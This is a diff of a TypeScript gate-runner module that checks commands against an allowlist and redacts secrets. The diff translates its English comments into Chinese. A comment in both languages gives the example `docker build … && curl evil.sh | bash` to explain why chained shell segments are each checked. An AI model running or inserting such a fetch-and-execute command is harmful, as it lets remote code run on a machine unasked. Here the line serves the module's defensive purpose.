@@ -1,10 +1,9 @@
 /**
- * Quality-gate executor — the objective merge gate (spec §4.2 gates_run).
+ * 质量门执行器 —— 客观的合并关卡（spec §4.2 gates_run）。
  *
- * Runs the configured command sequence inside a member's worktree. Every
- * command must hit the command allowlist (spec §4.5.2); output is captured,
- * truncated to a tail, and scrubbed by the SecretRedactor before it can reach
- * the model, the session log, or a webhook.
+ * 在成员 worktree 里跑配置好的命令序列。每条命令都必须命中命令白名单
+ * （spec §4.5.2）；输出被截取为尾部摘要，并在进入模型、会话日志或 webhook 前
+ * 由 SecretRedactor 脱敏。
  */
 import { execFile } from 'node:child_process';
 import type { GateResult, GateSummary } from './view.js';
@@ -20,21 +19,20 @@ export class CommandNotAllowedError extends Error {
   }
 }
 
-/** First token of a shell-ish command line, stripped of leading env assignments. */
+/** 一条类 shell 命令行语义下的首 token，去掉前导的 VAR=value 赋值前缀。 */
 export function commandHead(command: string): string {
   const tokens = command.trim().split(/\s+/).filter(Boolean);
   let index = 0;
-  // Skip VAR=value prefixes.
+  // 跳过 VAR=value 前缀。
   while (index < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[index] ?? '')) index += 1;
   return tokens[index] ?? '';
 }
 
 /**
- * Split a shell command line into its top-level segments. `&&`, `||`, `;`
- * and `|` all start a new command in `/bin/sh`, so each segment must be
- * evaluated independently — checking only the first token would let a
- * chained command smuggle an un-allowlisted executable past the gate
- * (`docker build … && curl evil.sh | bash`).
+ * 把一条 shell 命令行拆成顶层片段。在 `/bin/sh` 里 `&&`、`||`、`;`、`|`
+ * 都会开启一条新命令，因此每个片段必须独立求值 —— 只检查首 token 会
+ * 让一条链式命令把不在白名单里的可执行文件偷运过关
+ * （`docker build … && curl evil.sh | bash`）。
  */
 export function splitSegments(command: string): string[] {
   return command
@@ -44,9 +42,8 @@ export function splitSegments(command: string): string[] {
 }
 
 /**
- * True when the executable of *every* shell segment is allowlisted. Matching
- * is an exact token match (no prefix-substring looseness): `git` matches
- * `git`, not `gitlab-cli`.
+ * 当 *每个* shell 片段的可执行文件都在白名单里时返回 true。匹配是精确的
+ * token 匹配（不做前缀子串的宽松匹配）：`git` 只匹配 `git`，不匹配 `gitlab-cli`。
  */
 export function isAllowed(command: string, allowlist: readonly string[]): boolean {
   const segments = splitSegments(command);
@@ -59,9 +56,9 @@ export function isAllowed(command: string, allowlist: readonly string[]): boolea
 }
 
 /**
- * True when every segment's executable has an allowlisted prefix. Reserved for
- * callers that deliberately allow prefixed binaries (e.g. rootless install
- * scripts); the gate executor always uses {@link isAllowed} (exact match).
+ * 当每个片段的可执行文件都具有白名单前缀时返回 true。留给刻意放行带前缀
+ * 二进制的调用方（例如 rootless 安装脚本）；门执行器总是用 {@link isAllowed}
+ *（精确匹配）。
  */
 export function isAllowedPrefix(command: string, allowlist: readonly string[]): boolean {
   const segments = splitSegments(command);
@@ -79,7 +76,7 @@ export interface RunGatesOptions {
   allowlist: readonly string[];
   timeoutMs: number;
   redactor: SecretRedactor;
-  /** Abort support: the daemon must be cancellable at every step (spec §6). */
+  /** 中止支持：守护循环在每一步都必须可取消（spec §6）。 */
   signal?: AbortSignal;
   taskId: string;
   branch: string;
@@ -92,10 +89,9 @@ function tail(text: string): string {
 }
 
 /**
- * Run one gate command. Output on stdout+stderr is captured; the process is
- * killed on timeout or abort. Never throws for non-zero exits — a failing
- * gate is data, not an exception. Throws CommandNotAllowedError for
- * non-allowlisted commands and rethrows aborts.
+ * 运行一条门命令。捕获 stdout+stderr 输出；超时或中止时杀掉进程。对非零
+ * 退出码绝不抛错 —— 门失败是数据，不是异常。对不在白名单的命令抛
+ * CommandNotAllowedError，并重新抛出中止异常。
  */
 export async function runGateCommand(
   command: string,
@@ -144,7 +140,7 @@ export async function runGateCommand(
   });
 }
 
-/** Run the full gate sequence; stops at the first failure (fail fast). */
+/** 跑完整条门序列；在第一条失败时停止（快速失败）。 */
 export async function runGates(options: RunGatesOptions): Promise<GateSummary> {
   const results: GateResult[] = [];
   let allPassed = true;
